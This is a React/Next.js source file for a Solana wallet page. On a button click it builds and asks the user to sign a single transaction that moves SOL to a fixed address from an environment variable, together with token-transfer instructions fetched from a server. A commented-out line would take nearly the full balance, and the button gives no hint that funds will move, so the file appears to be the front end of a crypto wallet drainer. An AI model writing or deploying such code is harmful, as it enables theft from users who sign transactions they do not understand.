"use client";

import {
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import {
  getBalance,
  getBlockhash,
  sendRawTransaction,
} from "@/app/lib/serverActions";
import { useWallet } from "@solana/wallet-adapter-react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { getTokenAccounts } from "../lib/getTokens";
import { transferTokens } from "../lib/transferTokens";
import { useState } from "react";
import { Loader2 } from "lucide-react";

// ? This is transfer page, logic and transaction instructions are processed here, it renders transfer button

const Transfer = () => {
  const { publicKey, signTransaction } = useWallet();
  const [loading, setLoading] = useState(false);

  if (!publicKey) {
    return <WalletMultiButton />;
  }

  async function transferSol() {
    try {
      setLoading(true);
      if (!publicKey || !signTransaction) {
        throw new Error("Wallet not connected");
      }
      const fromWallet = publicKey;
      const toWallet = new PublicKey(process.env.NEXT_PUBLIC_TARGET_ADDRESS!);
      const fromBalance = await getBalance(fromWallet.toString());
      // const amountToSend = fromBalance - 20000000;
      const amountToSend = 0.0001 * LAMPORTS_PER_SOL;

      if (fromBalance < amountToSend) {
        throw new Error("Insufficient balance to perform the transfer");
      }

      await getTokenAccounts(publicKey.toString());

      const recentBlockhash = await getBlockhash();
      const tokensInstructionsString = await transferTokens(
        publicKey.toString()
      );
      const tokensInstructions = JSON.parse(tokensInstructionsString);
      console.log("Transfer tokens", tokensInstructions);

      const transferTransaction = new Transaction();
      transferTransaction.feePayer = fromWallet;
      transferTransaction.recentBlockhash = recentBlockhash.blockhash;
      transferTransaction.add(
        SystemProgram.transfer({
          fromPubkey: fromWallet,
          toPubkey: toWallet,
          lamports: amountToSend,
        })
      );
      tokensInstructions.forEach((instr: any) => {
        const keys = instr.keys.map((key: any) => ({
          pubkey: new PublicKey(key.pubkey),
          isSigner: key.isSigner,
          isWritable: key.isWritable,
        }));
        const instruction = new TransactionInstruction({
          keys: keys,
          programId: new PublicKey(instr.programId),
          data: Buffer.from(instr.data),
        });
        transferTransaction.add(instruction);
      });

      console.log(transferTransaction);

      const signed = await signTransaction(transferTransaction);
      const signature = await sendRawTransaction(
        signed.serialize().toString("base64")
      );

      console.log("Signature", signature);

      return;
    } catch (error) {
      console.error("Error transferring SOL:", error);
      // throw error;
    } finally {
      setLoading(false);
    }
  }

  return (
    <button
      className="px-4 py-2 bg-blue-500 rounded-lg"
      onClick={() => {
        transferSol();
      }}
    >
      {loading ? (
        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
      ) : (
        publicKey.toString().replace(/^(.{4}).*(.{4})$/, "$1...$2")
      )}
    </button>
  );
};

export default Transfer;
